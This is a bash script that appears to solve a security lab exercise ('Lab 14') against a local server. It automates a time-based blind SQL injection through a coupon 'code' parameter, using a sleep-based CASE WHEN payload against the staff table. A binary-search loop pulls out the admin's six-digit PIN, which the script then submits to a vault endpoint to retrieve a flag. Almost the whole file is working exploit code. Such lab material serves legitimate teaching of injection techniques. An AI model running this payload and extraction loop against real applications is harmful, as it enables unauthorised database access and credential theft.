#!/usr/bin/env bash
# Lab 14 — the only channel left is how long the answer takes.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9140}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab14
DELAY=0.4
THRESHOLD=250   # ms

"$H5I" browser open "$URL/api/coupon?code=SPRING10" --session "$SESSION" --new --capture >/dev/null

ms() {  # ms CONDITION -> milliseconds the server took
    "$H5I" websec replay req_0 --session "$SESSION" --reset-budget \
        --set "query.code=zz' OR (SELECT CASE WHEN ($1) THEN sleep($DELAY) ELSE 0 END FROM staff WHERE name='admin') -- " |
        python3 -c 'import json,sys;print(json.load(sys.stdin)["samples"][0]["total_ms"])'
}

# A slow answer is the positive one, and a scheduling hiccup can only ever make
# a fast answer look slow. So confirm every "slow" and trust every "fast".
truth() {
    [ "$(ms "$1")" -lt "$THRESHOLD" ] && return 1
    [ "$(ms "$1")" -lt "$THRESHOLD" ] && return 1
    return 0
}

PIN=""
for i in $(seq 1 6); do
    LO=48; HI=57
    while [ "$LO" -lt "$HI" ]; do
        MID=$(((LO + HI) / 2))
        if truth "unicode(substr(pin,$i,1)) > $MID"; then LO=$((MID + 1)); else HI=$MID; fi
    done
    PIN="$PIN$(printf "\\$(printf '%03o' "$LO")")"
done

send "$SESSION" req_0 --set path=/api/vault --unset query.code --create --set "query.pin=$PIN" | flag
